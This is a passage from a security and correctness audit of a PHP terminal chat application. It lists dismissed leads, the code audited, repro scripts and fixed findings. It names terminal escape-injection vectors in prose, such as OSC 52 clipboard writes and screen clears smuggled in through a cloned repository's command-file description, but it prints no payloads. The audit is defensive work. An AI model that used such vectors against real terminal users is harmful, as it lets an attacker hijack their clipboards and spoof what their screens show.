  - `EngineBackend::completeAsync()` rejects (it does not resolve an error Message) on cancellation, worker failure and provider error (`:1334`, `:1415`, `:1821`, `:1827`, `:2020`).
  - Esc Esc remains the release route if the promise never settles.
  - The only residual hazard is generic, not specific to this route: a backend that **throws synchronously** inside the `Cmd::promise` factory escapes candy-core's `futureTick` callback (`Program::scheduleCmd()`), and Chat has no `ExceptionMsg` arm. No shipped backend does this.
- **Lead 2, `App::feedChat()` keeping only the last Cmd:** `r11_feedchat_cmds.php` replays the exact key sequence `runRegistryCommand()` synthesizes for every `CommandRegistry` row (slash rows and Ctrl+P palette rows) into an idle Chat. No key before Enter returns a Cmd, so nothing is dropped today. The contract is undocumented and fragile; for example, a cursor-blink Cmd from the input widget would be lost.
- **Lead 5, `--continue` after `/clear`:** `/clear` keeps the session id and saves an empty transcript on purpose. `loadTranscript()` honouring that empty transcript over older checkpoints is correct; resuming the pre-clear conversation would undo the user's `/clear`. `/rewind` still reaches the checkpoints.
- **Lead 6:** confirmed and folded into 15b-10 (`r13_stream_cost.php`).
- **Lead 7, `backgroundStatuses` growth:** `BackgroundSupervisor::getSession()` is an in-memory array read (`src/Sessions/BackgroundSupervisor.php:134-137`), so the per-tick cost per finished session is negligible.
- **Stale mouse zones after a resize** (next step 4 of the checkpoint): candy-core renders on its framerate tick and zones are recorded from the frame actually painted. A click is hit-tested against what the user saw, which is the correct semantics; a resize and a click inside the same tick (≈16 ms) is not a realistic sequence.
- **Skills pane, agent panes, MCP panel and diff box with hostile text:** clean. `SkillsPane`'s `Width::truncate()` strips escapes (verified with an OSC 52 directory name and description, `r18_skill_pane.php`). `AgentSplitColumn`, `AgentDashboardPane`, `FilesPane` and `ToolsPane` go through `PaneLabel`. `McpPanel` sanitizes. `renderDiff()` splits on CR and truncates per row.

**Existing suites rerun** (local vendor, guarded): `InFlightInputQueueTest` (25 tests), `SessionStartHookWireTest` (14), `AutomaticCompactionModelSummaryTest` (37) and `SlashMenuTabCompletionTest` (15) are all green. None of them pins the behaviour reported in 15b-01, 15b-16 or 15b-18. `RendererTest`'s three tab-strip tests check presence and brackets only, not width.

---

## Coverage

**Audited:**
- **Chat turn machinery:** `submit()`, the queue and refusal paths, `dispatchTurn()`, every `route()` arm listed in 15b-01…06, the Escape cancel arm, the permission flow (`beginToolCalls()` … `handlePermissionKey()`), tool-event pumping and placeholder replacement, backend completion, the titler and suggestions, the parked and model compaction routes (`scheduleParkedCompaction()`, `buildSummarizationRequest()`, `applyModelCompaction()`, `compactionChanges()`, `messagesFromWire()`), `persistTranscript()` and `switchToSession()`, `/clear`, palette New session, `subscriptions()` and the background/runtime pumps, and token estimation.
- **Chat input and commands:** `CommandParser`; `dispatchCommand()` with `/rewind`, `/rename`, `/branch`, `/theme`, `/workflow` (dispatch and help), `/help` and the `mcp auth` routing; `expandCustomCommand()`, `commandDirective()` and `refuseCommandShell()`; the slash popup model (`slashMenuMatches()` and related); the palette dispatch (`runSelectedPaletteAction()`, `runRootPaletteAction()`, `runSelectedPaletteActionWhileInFlight()`); input-history recall and recording; `cappedOsc52()` and `relayWidgetCmd()`; and the paste arm.
- **Chat mouse handling:** text selection (`trackTextSelection()`), `SystemClipboard`, and zone lifecycle (`scanRoot()`, `maskImageMarkers()`).
- **`src/Commands/`:** `CommandLoader` (tiers, symlink containment, control-plane reservation) and `CommandSpec` (`fromFile()`, `expandTemplate()`, `runShellSubstitution()`, `includeFile()`).
- **`src/Renderer.php`:** `renderView()`, the status bar, history, assistant, streaming and tool rows, the tool body, the diff, `renderToolImage()`, the slash menu, the session picker entry, the session tab strip, `renderAgentView()`, `renderPermissionPrompt()` and `wrapPermissionText()`, `fitToPane()`, and the `untrusted()` wrapper. Overlay width was fuzzed at 16-48 columns and 8-24 rows (`r17`).
- **Hosted App and TUI:** `App::view()`, `consumeShellCmd()`, `runRegistryCommand()`, `feedChat()`; `Tui\Renderer::renderView()`; `ChatPane`, `FilesPane`, `SkillsPane`, `AgentsPane`, `AgentOutputPane` and the agent split/dashboard sanitization; `PaneLabel`; `KeyboardHandler` (claims, ownership, handle); and the `KeyBindingRegistry` roster.
- **candy-core seams relied on:** `Cmd::promise()`/`AsyncCmd` dispatch, `Program::renderFrame()` image resolution, and `ImageOverlay`; candy-mosaic `ImageLayer` id allocation.
- **Persistence:** `EnhancedSessionStore::saveTranscript()`, `internMessages()` and `loadTranscript()` (cost measured); `SessionStore::listSessions()` memoisation; `PromptHistory` file mode.

**Read only for reachability or skimmed (no defects claimed):**
- `invokeTool()`, `forkToolCalls()`, `gateToolCall()` and `collectToolResult()`. This is Chat's local tool path and is unreachable in production because `Bootstrap::chat()` passes no `tools:`. That is also why 15b-19 is latent.
- `/memory` (known #14), `/sessions` picker internals beyond `sanitizeSessionRows()`, `/bg` and `/fork` (known #30), `/websearch` (known #22), `/budget`, and the `/pane` / `/layout` handlers.
- `intraExchangeTruncation()` and `compactNow()` (mostly covered by known #15-#20).
- `handlePaletteKey()`'s cluster caret helpers.
- `selectPaletteProvider()` and `selectPaletteTheme()` (known #32).
- `SessionPicker`, `SessionTabs` (`Tui/`), `SplitLayout`, `PaneDragController`, `TextSelection` extraction, `DiffGutter`, `McpPanel`, `StallDetector`, `TerminalBackground`, `MenuBar`, `MultiplexerSplitPane`, `Theme.php` and `Palette/*`. These were scanned for blocking I/O and unsanitized external text only; nothing was found beyond the items above.

**Not audited:**
- Pixel-level PaneDrag/SplitLayout geometry under resize.
- `KeyboardHandler`'s full chord table against the docs (pinned separately by `KeyBindingDriftTest`).
- `renderKeyHelp()` content.
- `/workflow run` execution internals (WorkflowEngine is in report 15e's scope).

**Repro scripts** (`/home/sites/crush-research-repos/_audit-scratch/15b/`, each run with `php <script>` and autoloaded via `sugar-crush/vendor/autoload.php`):

| Script | Shows |
|---|---|
| `harness.php` | Shared helpers: `RecBackend`, `runCmd` / `pump` / `type` / `enter` / `dumpHist` |
| `md_inject.php` | U+009B passes CandyShine (15b-08) |
| `r1_wire.php` | Command output and notices on the wire (15b-03) |
| `r2_stale_placeholder.php` | Placeholder after cancel; result mis-attached (15b-02) |
| `r3_width.php` / `r3b.php` | Status bar overwidth; 25-column overflow; CR in frame (15b-07, 15b-09) |
| `r4_app.php` (+ `prov.php`) | Hosted App frame with CR (15b-07) |
| `r5_cmdparse.php` | `mcp auth` prefix capture (15b-11) |
| `r6_hook_bypass.php` | Hook bypass on the parked route (15b-01) |
| `r7_perf.php` / `r7b.php` | History render cost (15b-10) |
| `r8_menu_draft.php` | Draft erased by menu (15b-05) |
| `r9_toolinj.php` | Per-field tool-row injection matrix (15b-07, 15b-08) |
| `r10_forged_marker.php` | Forged image marker gives a second paint; PUA glyphs blanked (15b-17) |
| `r11_feedchat_cmds.php` | No intermediate Cmd in any registry key sequence (lead 2, dropped) |
| `r12_persist_cost.php` | Transcript save cost, branch re-intern (15b-21) |
| `r13_stream_cost.php` | Streaming partial render cost (15b-10) |
| `r14_cmd_shell.php` | 10 s blocking `` !`…` ``; orphaned grandchild (15b-20) |
| `r15_overlay_inject.php` | OSC 52 / CSI 2J / CR from a project command file in the "/" popup (15b-16) |
| `r16_wordwrap_utf8.php` | Byte-wrapped permission text; CR survives (15b-19) |
| `r17_overlay_width.php` | Overlay width and height fuzz (15b-09) |
| `r18_skill_pane.php` | Skills pane strips hostile names (dropped) |
| `r19_tabstrip.php` / `r19b_tabstrip_noevil.php` | Tab strip width and escapes, standalone and hosted (15b-18) |
| `r20_rewind_args.php` | `/rewind help` rewinds; `/rename:x` stores `:x` (15b-22) |
| `dbg.php` / `dbg2.php` | Scratch only |

---

## Fixed since audit

These findings were fixed on master after the audit. Their sections and table rows were removed; the repro and coverage lists above still name them.

- **15b-01** UserPromptSubmit hook skipped on the parked 85% compaction route — fixed on master in `9c13a918e`. Residual: if the summary later refuses the turn (spend cap or the 95% tier), the hook has already seen the prompt.
- **15b-16** A cloned repository's command-file description wrote OSC 52 and screen clears to the terminal on "/" — fixed on master in `cb3dee7fd`.
